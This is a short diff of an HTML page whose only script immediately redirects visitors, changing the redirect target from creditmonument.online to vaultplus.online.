@@ -9,7 +9,7 @@
 </head>
 <body>
 	<script>
-		window.location.replace('https://creditmonument.online/');
+		window.location.replace('https://vaultplus.online');
 	</script>
 </body>
 </html>
